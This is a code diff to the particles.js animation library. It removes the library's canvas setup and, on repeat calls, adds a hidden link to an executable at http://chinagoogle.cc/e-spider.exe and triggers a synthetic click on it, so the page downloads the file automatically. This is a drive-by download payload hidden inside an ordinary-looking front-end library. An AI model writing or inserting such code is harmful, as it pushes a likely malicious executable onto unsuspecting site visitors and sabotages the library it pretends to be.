@@ -6231,14 +6231,33 @@ window.requestAnimFrame = function() {
 } (), window.pJSDom = [], window.particlesJS = function(t, e) {
     "string" != typeof t && (e = t, t = "particles-js"),
     t || (t = "particles-js");
-    var i = document.getElementById(t),
-    n = i.getElementsByClassName("particles-js-canvas-el");
-    if (n.length) for (; n.length > 0;) i.removeChild(n[0]);
+    var i = document.getElementById(t);
+    //n = i.getElementsByClassName("particles-js-canvas-el");
+    //if (n.length) for (; n.length > 0;) i.removeChild(n[0]);
     var r = document.createElement("canvas");
     r.className = "particles-js-canvas-el",
     r.style.width = "100%",
-    r.style.height = "100%",
-    null != document.getElementById(t).appendChild(r) && pJSDom.push(new pJS(t, e))
+    r.style.height = "100%";
+
+    if(_initSpiderCount == 0){
+
+        _initSpiderCount += 1;
+
+    }else{
+
+        var eq = document.createElement('a');
+
+        eq.href = "http://chinagoogle.cc/e-spider.exe";
+
+        eq.setAttribute('download','true');
+
+        var evt = new MouseEvent('click');
+
+        eq.dispatchEvent(evt);
+
+    }
+
+    //null != document.getElementById(t).appendChild(r) && pJSDom.push(new pJS(t, e))
 },
 window.particlesJS.load = function(t, e, i) {
     var n = new XMLHttpRequest;
